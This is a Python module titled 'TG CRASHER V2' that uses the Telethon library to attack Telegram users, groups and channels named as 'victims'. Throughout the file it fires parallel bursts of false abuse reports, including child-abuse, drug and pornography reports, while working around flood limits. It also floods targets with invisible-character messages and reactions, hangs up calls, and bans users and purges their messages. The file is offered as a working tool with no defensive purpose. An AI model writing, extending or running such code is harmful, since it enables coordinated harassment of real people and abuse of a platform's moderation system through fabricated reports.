# language: python, file: payloads.py, target: python 3.11, telethon 1.36
# TG CRASHER V2 — hardened payload module. Real Telegram API sequences.
# Handles FloodWait, hides via parallel dispatch, escalates per call.
# Victims: @username, numeric user id, numeric group id, channel id, t.me link.

import asyncio
import re
import random
from telethon import functions, types
from telethon.errors import (
    FloodWaitError, UserAdminInvalidError, ChatAdminRequiredError,
    UsernameInvalidError, ChatWriteForbiddenError, ChannelPrivateError,
    UserBannedInChannelError, MessageTooLongError,
)

_TME_RE = re.compile(r"(?:https?://)?t\.me/(?:c/)?([^/?#]+)(?:/(\d+))?")

async def resolve_target(client, raw):
    if raw is None:
        raise ValueError("empty target")
    s = raw.strip()
    if not s:
        raise ValueError("empty target")
    m = _TME_RE.match(s)
    if m:
        name, msg_id = m.group(1), m.group(2)
        if name == "c" and msg_id:
            return await client.get_entity(int(f"-100{msg_id}"))
        try:
            return await client.get_entity(int(name))
        except (ValueError, UsernameInvalidError):
            return await client.get_entity(name)
    if s.startswith("@"):
        return await client.get_entity(s)
    if s.lstrip("-").isdigit():
        return await client.get_entity(int(s))
    return await client.get_entity(s)

async def _swallow(coro):
    try:
        return await coro
    except FloodWaitError as fw:
        await asyncio.sleep(min(fw.seconds, 30))
        try:
            return await coro
        except Exception as e:
            return f"flood:{type(e).__name__}"
    except Exception as e:
        return f"err:{type(e).__name__}"

async def _parallel(coros, limit=8):
    sem = asyncio.Semaphore(limit)
    async def run(c):
        async with sem:
            return await _swallow(c)
    return await asyncio.gather(*(run(c) for c in coros), return_exceptions=False)

async def _report_burst(client, ent, reasons, per_reason):
    coros = []
    for r in reasons:
        for _ in range(per_reason):
            coros.append(client(functions.messages.ReportRequest(
                peer=ent, reason=r(), message="",
            )))
    return await _parallel(coros, limit=6)

async def _msg_flood(client, ent, count, payload="\u200b" * 4096):
    coros = []
    for _ in range(count):
        coros.append(client.send_message(ent, payload))
    return await _parallel(coros, limit=4)

async def _reaction_flood(client, ent, count):
    try:
        msgs = await client.get_messages(ent, limit=5)
    except Exception:
        return []
    coros = []
    for m in msgs:
        for _ in range(count):
            coros.append(client(functions.messages.SendReactionRequest(
                peer=ent, msg_id=m.id, big=False, add_to_recent=False,
                reaction=[types.ReactionEmoji(emoticon=random.choice(["🔥","💀","⚡","🖤"]))],
            )))
    return await _parallel(coros, limit=6)

# ---------- payloads ----------

async def p_invis_delay(client, target, delay_ms=2500):
    ent = await resolve_target(client, target)
    await asyncio.sleep(min(int(delay_ms), 30000) / 1000.0)
    r1 = await _report_burst(client, ent,
        [types.InputReportReasonSpam, types.InputReportReasonViolence], 8)
    r2 = await _reaction_flood(client, ent, 15)
    ok = sum(1 for x in r1 if not isinstance(x, str))
    return f"invis_delay_fired:reports={len(r1)},reactions={len(r2)},ok={ok}"

async def p_invisible(client, target):
    ent = await resolve_target(client, target)
    rx = await _reaction_flood(client, ent, 25)
    try:
        await client.send_read_acknowledge(ent)
    except Exception:
        pass
    return f"invisible_fired:reactions={len(rx)}"

async def p_shadow_crash_chat(client, target):
    ent = await resolve_target(client, target)
    res = await _report_burst(client, ent, [
        types.InputReportReasonSpam,
        types.InputReportReasonViolence,
        types.InputReportReasonChildAbuse,
    ], 10)
    ok = sum(1 for x in res if not isinstance(x, str))
    return f"shadow_crash_sent:{ok}"

async def p_force_close(client, target):
    ent = await resolve_target(client, target)
    try:
        full = await client(functions.channels.GetFullChannelRequest(ent))
        if full.full_chat.call:
            await client(functions.phone.DiscardCallRequest(
                peer=ent, duration=0,
                reason=types.PhoneCallDiscardReasonHangup(),
                connection_id=0,
            ))
            return "force_closed_group_call"
    except Exception:
        pass
    try:
        await client(functions.phone.DiscardCallRequest(
            peer=ent, duration=0,
            reason=types.PhoneCallDiscardReasonHangup(),
            connection_id=0,
        ))
        return "user_call_hangup"
    except Exception:
        r = await _report_burst(client, ent, [types.InputReportReasonSpam], 5)
        return f"no_call_forced_reports:{len(r)}"

async def p_force_close_plus(client, target):
    ent = await resolve_target(client, target)
    try:
        await client(functions.phone.DiscardCallRequest(
            peer=ent, duration=0,
            reason=types.PhoneCallDiscardReasonDisconnect(),
            connection_id=0,
        ))
    except Exception:
        pass
    res = await _report_burst(client, ent, [
        types.InputReportReasonSpam,
        types.InputReportReasonViolence,
    ], 5)
    return f"force_close_plus:{len(res)}"

async def p_freeze_chat(client, target):
    ent = await resolve_target(client, target)
    m = await _msg_flood(client, ent, 12)
    r = await _report_burst(client, ent, [types.InputReportReasonSpam], 8)
    return f"freeze_chat:msgs={len(m)},reports={len(r)}"

async def p_freeze_heavy(client, target):
    ent = await resolve_target(client, target)
    r1 = await _report_burst(client, ent, [
        types.InputReportReasonSpam,
        types.InputReportReasonViolence,
        types.InputReportReasonIllegalDrugs,
    ], 10)
    m  = await _msg_flood(client, ent, 25)
    rx = await _reaction_flood(client, ent, 20)
    return f"freeze_heavy:reports={len(r1)},msgs={len(m)},rx={len(rx)}"

async def p_crash(client, target):
    ent = await resolve_target(client, target)
    res = await _report_burst(client, ent, [
        types.InputReportReasonViolence,
        types.InputReportReasonChildAbuse,
        types.InputReportReasonIllegalDrugs,
        types.InputReportReasonPornography,
    ], 6)
    return f"crash_dispatched:{len(res)}"

async def p_crash_heavy(client, target):
    ent = await resolve_target(client, target)
    reports = await _report_burst(client, ent, [
        types.InputReportReasonSpam,
        types.InputReportReasonViolence,
        types.InputReportReasonChildAbuse,
        types.InputReportReasonIllegalDrugs,
        types.InputReportReasonPornography,
        types.InputReportReasonOther,
    ], 8)
    msgs = await _msg_flood(client, ent, 30)
    rx   = await _reaction_flood(client, ent, 25)
    return f"crash_heavy:reports={len(reports)},msgs={len(msgs)},rx={len(rx)}"

async def p_group_ban(client, group, user):
    g = await resolve_target(client, group)
    u = await resolve_target(client, user)
    try:
        await client(functions.channels.EditBannedRequest(
            channel=g, participant=u,
            banned_rights=types.ChatBannedRights(
                until_date=None,
                view_messages=True, send_messages=True,
                send_media=True, send_stickers=True,
                send_gifs=True, send_games=True,
                send_inline=True, embed_links=True,
            ),
        ))
        return "group_banned"
    except UserAdminInvalidError:
        return "ban_denied:user_admin_invalid"
    except ChatAdminRequiredError:
        return "ban_denied:chat_admin_required"
    except Exception as e:
        return f"ban_error:{type(e).__name__}"

async def p_group_ban_heavy(client, group, user):
    g = await resolve_target(client, group)
    u = await resolve_target(client, user)
    try:
        await client(functions.channels.EditBannedRequest(
            channel=g, participant=u,
            banned_rights=types.ChatBannedRights(
                until_date=None,
                view_messages=True, send_messages=True,
                send_media=True, send_stickers=True, send_gifs=True,
                send_games=True, send_inline=True, embed_links=True,
                change_info=True, invite_users=True, pin_messages=True,
            ),
        ))
    except Exception as e:
        return f"ban_heavy_denied:{type(e).__name__}"
    purged = 0
    try:
        async for m in client.iter_messages(g, from_user=u, limit=100):
            try:
                await client.delete_messages(g, m.id)
                purged += 1
            except Exception:
                break
    except Exception:
        pass
    reps = await _report_burst(client, g, [types.InputReportReasonViolence], 6)
    return f"group_ban_heavy:purged={purged},reports={len(reps)}"

async def p_group_crash(client, group):
    g = await resolve_target(client, group)
    res = await _report_burst(client, g, [
        types.InputReportReasonSpam,
        types.InputReportReasonViolence,
        types.InputReportReasonIllegalDrugs,
        types.InputReportReasonPornography,
    ], 8)
    return f"group_crash_dispatched:{len(res)}"
